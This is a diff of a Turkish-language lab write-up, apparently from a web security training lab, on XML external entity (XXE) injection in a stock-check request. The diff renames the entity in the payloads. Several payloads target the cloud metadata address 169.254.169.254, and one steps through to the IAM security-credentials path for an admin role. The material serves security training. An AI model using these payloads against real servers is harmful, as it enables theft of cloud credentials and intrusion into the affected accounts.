@@ -14,9 +14,9 @@ Bu labda stok kontrolü için gönderilen XML verisinin sunucu tarafında güven
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+<!DOCTYPE stockCheck [ <!ENTITY baris SYSTEM "http://169.254.169.254/latest"> ]>
 <stockCheck>
-  <productId>&xxe;</productId>
+  <productId>&baris;</productId>
   <storeId>1</storeId>
 </stockCheck>
 ```
@@ -25,9 +25,9 @@ Final payload:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<!DOCTYPE stockCheck [ <!ENTITY baris SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
 <stockCheck>
-  <productId>&xxe;</productId>
+  <productId>&baris;</productId>
   <storeId>1</storeId>
 </stockCheck>
 ```
@@ -42,10 +42,10 @@ Final payload:
 
 ![XML stok kontrol isteğinin yakalanması](images/lab2/2.png)
 
-3. XML verisinin başına external entity tanımı içeren bir `DOCTYPE` ekledim ve entity hedefini cloud metadata servisinin link-local adresi olan `http://169.254.169.254/` olarak belirledim.
+3. XML verisinin başına external entity tanımı içeren bir `DOCTYPE` ekledim ve entity hedefini cloud metadata servisinin link-local adresi olan `http://169.254.169.254/latest` olarak belirledim.
 
 ```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+<!DOCTYPE stockCheck [ <!ENTITY baris SYSTEM "http://169.254.169.254/latest"> ]>
 ```
 
 4. Entity referansını `productId` alanında çağırarak isteği gönderdim. Response içinde metadata servisinden dönen path bilgileri görüntülendi.
@@ -55,7 +55,7 @@ Final payload:
 5. Response içindeki path bilgilerini takip ederek entity hedefini sırasıyla metadata alt dizinlerine yönlendirdim. Son olarak IAM credential endpoint'i olan `/latest/meta-data/iam/security-credentials/admin` adresine ulaştım.
 
 ```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<!DOCTYPE stockCheck [ <!ENTITY baris SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
 ```
 
 ![IAM security credentials endpointinin hedeflenmesi](images/lab2/4.png)
